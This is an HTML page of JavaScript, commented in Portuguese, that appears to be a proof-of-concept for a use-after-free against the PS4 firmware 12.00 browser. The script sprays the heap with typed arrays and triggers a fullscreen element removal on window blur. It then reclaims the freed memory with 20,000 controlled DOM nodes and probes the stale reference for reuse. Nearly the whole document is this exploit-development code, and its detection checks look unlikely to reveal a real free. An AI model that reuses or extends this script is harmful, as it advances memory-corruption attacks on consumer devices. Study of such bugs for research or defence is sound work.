
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 - UAF Reclaim Test</title>
</head>
<body style="background:#222;color:#0f0;font-family:monospace;">

<h2>PS4 12.00 - Fullscreen UAF → Reclaim</h2>
<button onclick="runTest()">Run Test</button>

<div id="log" style="margin-top:20px;"></div>

<script>
function log(msg) {
    try { console.log(msg); } catch(e){}
    document.getElementById("log").innerHTML += "<p>" + msg + "</p>";
}

// ==========================
// HEAP SETUP (inalterado)
// ==========================
function setupHeap() {
    let controllers = [];

    for(let i = 0; i < 5000; i++) {
        let arr = new Float64Array(8);
        arr[0] = i;
        controllers.push(arr);
    }

    return controllers;
}

// ==========================
// FULLSCREEN (inalterado)
// ==========================
function setupFullscreen() {
    let fsTarget = document.createElement("div");

    fsTarget.innerHTML = "<h1 style='margin-top:20%;text-align:center;'>FULLSCREEN ACTIVE<br>Press OPTIONS</h1>";

    fsTarget.style.background = "black";
    fsTarget.style.width = "100%";
    fsTarget.style.height = "100%";
    fsTarget.style.position = "absolute";
    fsTarget.style.top = "0";
    fsTarget.style.left = "0";

    document.body.appendChild(fsTarget);

    if (fsTarget.webkitRequestFullscreen) {
        fsTarget.webkitRequestFullscreen();
    } else {
        document.documentElement.webkitRequestFullscreen?.();
    }

    return fsTarget;
}

// ==========================
// RECLAIM (NOVO)
// ==========================
function reclaimDOM() {
    log("[*] Iniciando DOM reclaim...");

    let reclaim = [];

    for (let i = 0; i < 20000; i++) {
        let el = document.createElement("div");

        // padrões controláveis
        el.innerHTML = "REUSE_" + i;
        el.setAttribute("data-x", i);

        reclaim.push(el);
    }

    log("[*] Reclaim concluído: " + reclaim.length + " objetos");
    return reclaim;
}

// ==========================
// DETECÇÃO (NOVO)
// ==========================
function checkUAF(fsTarget) {
    log("---- CHECK UAF ----");

    try {
        let val = fsTarget.innerHTML;
        log("[CHECK] innerHTML = " + val);
    } catch(e) {
        log("[UAF DETECTADO] innerHTML falhou: " + e);
    }

    try {
        let attr = fsTarget.getAttribute("data-x");
        log("[CHECK] data-x = " + attr);
    } catch(e) {
        log("[UAF DETECTADO] attribute falhou: " + e);
    }
}

// ==========================
// TRIGGER (INALTERADO)
// ==========================
function trigger(fsTarget) {
    log("[*] Trigger: remove + exitFullscreen");

    try {
        fsTarget.remove();

        if (document.webkitIsFullScreen || document.fullscreenElement) {
            document.webkitExitFullscreen?.() || document.webkitCancelFullScreen?.();
        }

    } catch(e) {
        log("[ERRO] " + e);
    }

    // 🔥 RECLAIM IMEDIATO APÓS LIBERAÇÃO
    let reclaim = reclaimDOM();

    // 🔬 CHECAR POSSÍVEL REUTILIZAÇÃO
    setTimeout(() => {
        checkUAF(fsTarget);
    }, 100);

    // 🔁 comportamento original mantido
    setTimeout(() => location.reload(), 5000);
}

// ==========================
// MAIN (INALTERADO)
// ==========================
function runTest() {
    const logDiv = document.getElementById("log");
    logDiv.innerHTML = "<p>Running... Press OPTIONS</p>";

    log("[*] Iniciando teste");

    let controllers = setupHeap();
    let fsTarget = setupFullscreen();

    window.onblur = function() {
        log("[*] onblur disparado");

        // 🔒 NÃO ALTERAR TIMING ORIGINAL
        setTimeout(() => trigger(fsTarget), 3000);
    };
}
</script>

</body>
</html>
